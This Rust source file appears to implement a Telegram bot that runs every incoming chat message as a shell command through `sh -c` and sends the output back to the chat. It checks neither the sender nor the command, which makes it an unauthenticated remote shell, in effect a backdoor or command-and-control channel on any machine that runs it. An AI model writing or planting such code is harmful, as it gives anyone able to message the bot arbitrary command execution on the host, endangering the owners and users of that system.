mod telegram_api;
use std::process::Command;
use std::{thread, time};

fn incoming_msg_cb(chat_id: u32, text: &String) {

    println!("Running command: {}", text);

    if text == "exit" {
        thread::sleep(time::Duration::from_millis(500));
        std::process::exit(5);
    }


    match Command::new("sh")
                    .arg("-c")
                    .arg(&text)
                    .output() {
        Err(e) => {
            telegram_api::TelegramAPI::send_msg(chat_id, &format!("Error {} in running command: {}", e, text));
        },
        Ok(out) => {
            telegram_api::TelegramAPI::send_msg(chat_id, &String::from_utf8_lossy(&out.stdout));
        }
    };
}

pub fn main_loop() {
    telegram_api::TelegramAPI::init(incoming_msg_cb);

    loop {

    }
}